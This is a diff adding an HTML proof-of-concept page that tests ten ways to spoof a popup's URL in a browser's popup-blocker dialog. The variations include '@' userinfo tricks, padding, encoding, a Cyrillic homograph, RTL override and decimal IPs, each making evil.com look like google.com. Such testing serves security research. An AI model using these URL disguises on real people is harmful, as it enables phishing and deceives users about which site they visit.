@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Popup URL Spoof Test</title>
+<style>
+  body { font-family: monospace; background: #0a0a0f; color: #ddd; padding: 20px; }
+  h2 { color: #ff4444; font-size: 16px; margin-top: 20px; }
+  button { padding: 10px 14px; margin: 4px; border: 1px solid #444; background: #1a1a2e; color: #fff; border-radius: 6px; cursor: pointer; font-size: 12px; }
+  button:hover { background: #2a2a3e; }
+  .info { color: #888; font-size: 11px; margin: 2px 0; }
+  pre { background: #111; padding: 10px; border-radius: 6px; font-size: 10px; color: #888; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+
+<h2>Popup URL Spoof — Bypass Variations</h2>
+<p class="info">Each button opens a popup with a spoofed URL. Observe the popup blocker dialog.</p>
+
+<h3>Original Attack</h3>
+<button onclick="test('https://www.google.com@evil.com/example-thing#search?q=what+is+claude')">
+  Original: google.com@evil.com
+</button>
+<button onclick="test('https://www.google.com/search?q=what+is+claude')">
+  Legit: google.com/search
+</button>
+
+<h3>Bypass 1: Long Userinfo (push @ out of view)</h3>
+<button onclick="test('https://accounts.google.com.signin.verify.security' + '.'.repeat(30) + '@evil.com/search?q=test')">
+  Long userinfo + @
+</button>
+
+<h3>Bypass 2: URL-encoded @ (%40)</h3>
+<button onclick="test('https://www.google.com%40evil.com/search?q=test')">
+  %40 instead of @
+</button>
+
+<h3>Bypass 3: Long Path Before Fragment</h3>
+<button onclick="test('https://www.google.com@evil.com' + '/thing'.repeat(40) + '#search?q=what+is+claude')">
+  Long path after @
+</button>
+
+<h3>Bypass 4: Double @</h3>
+<button onclick="test('https://www.google.com/search?q=test@evil.com@evil.com/path')">
+  Double @ sign
+</button>
+
+<h3>Bypass 5: IDN Homograph in real host</h3>
+<button onclick="test('https://www.google.com@еvil.com/search?q=test')">
+  Cyrillic 'е' in evil
+</button>
+
+<h3>Bypass 6: IPv4 Address Spoof</h3>
+<button onclick="test('https://www.google.com@2130706433/search?q=test')">
+  Decimal IP address
+</button>
+
+<h3>Bypass 7: Newlines/Spaces</h3>
+<button onclick="test('https://www.google.com%0a%0d@evil.com/search?q=test')">
+  Newlines before @
+</button>
+
+<h3>Bypass 8: RTL Character in URL</h3>
+<button onclick="test('https://www.google.com‮@evil.com/search?q=test')">
+  RTL Override
+</button>
+
+<h3>Bypass 9: Massive Spaces (like data URI attack)</h3>
+<button onclick="test('https://www.google.com' + '%20'.repeat(100) + '@evil.com/search?q=test')">
+  Spaces before @
+</button>
+
+<h3>Bypass 10: Backslash tricks</h3>
+<button onclick="test('https://www.google.com\\@evil.com/search?q=test')">
+  Backslash before @
+</button>
+
+<hr>
+<pre id="log"></pre>
+
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += '\n' + new Date().toLocaleTimeString() + ' ' + msg;
+}
+
+function test(url) {
+  log('Opening: ' + url.substring(0, 100) + '...');
+  try {
+    var w = window.open(url, '_blank', 'width=800,height=600');
+    if (!w) {
+      log('  -> Popup BLOCKED. Check the popup blocker dialog for the URL.');
+    } else {
+      log('  -> Popup opened. URL: ' + (w.location.href || 'unknown'));
+      setTimeout(function() { try { w.close(); } catch(_) {} }, 1000);
+    }
+  } catch(e) {
+    log('  -> Error: ' + e.message);
+  }
+}
+
+// Auto-trigger original attack on load
+log('Click any button to test. Check Chrome popup blocker dialog for URL display.');
+log('The popup blocker shows truncated URL — compare legit vs spoofed.');
+</script>
+</body>
+</html>
